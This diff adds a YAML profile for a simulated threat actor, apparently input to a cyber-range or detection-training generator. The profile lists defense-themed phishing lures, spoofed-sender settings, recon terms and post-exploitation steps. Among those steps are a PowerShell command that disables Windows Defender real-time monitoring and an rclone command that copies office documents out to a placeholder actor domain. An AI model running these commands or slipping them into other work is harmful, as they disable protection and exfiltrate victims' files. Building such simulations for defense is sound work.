@@ -1,0 +1,66 @@
+name: GearWorks
+effectiveness: 70
+count_init_passive_dns: 5
+max_wave_size: 2
+attacks:
+  - recon:browsing
+  - email:malware_delivery
+  - delivery:supply_chain
+domain_themes:
+  - defense
+  - military
+  - weapons
+  - technology
+  - engineering
+  - manufacturing
+  - logistics
+  - supply_chain
+sender_themes:
+  - supplier
+  - vendor
+  - logistics
+  - delivery
+  - shipping
+  - procurement
+  - manufacturing
+subjects:
+  - "Request for quote on metal components for military vehicles"
+  - "Inquiry about delivery schedules for ShieldIndustries"
+  - "New product offerings for ShieldIndustries"
+  - "Important announcement regarding shipment of ShieldIndustries order"
+  - "New product brochure for military-grade mechanical parts"
+recon_search_terms:
+  - ShieldIndustries
+  - defense industry
+  - military vehicle parts
+  - aerospace parts supplier
+  - logistics for military equipment
+  - military-grade manufacturing
+file_names:
+  - Quote-for-Metal-Components.docx
+  - Delivery-Schedule-Information.docx
+  - New-Product-Offerings.docx
+  - Shipment-Status-Update.docx
+  - New-Product-Brochure.docx
+tlds:
+  - com
+  - net
+spoofs_email: True
+malware:
+  - gearworm
+post_exploit_commands:
+  - name: cmd.exe
+    process: cmd.exe dirr
+  - name: cmd.exe
+    process: cmd.exe dir
+  - name: cmd.exe
+    process: "cmd.exe dir C:\\"
+  - name: cmd.exe
+    process: "cmd.exe dir E:\\"
+  - name: cmd.exe
+    process: "cmd.exe cd Documents"
+  - name: cmd.exe
+    process: "cmd.exe powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
+  - name: rclone.exe 
+    process: 'rclone.exe copy --transfers12 "*docx" "*xls" "*pdf" "*zip" {actor_domain}'
+
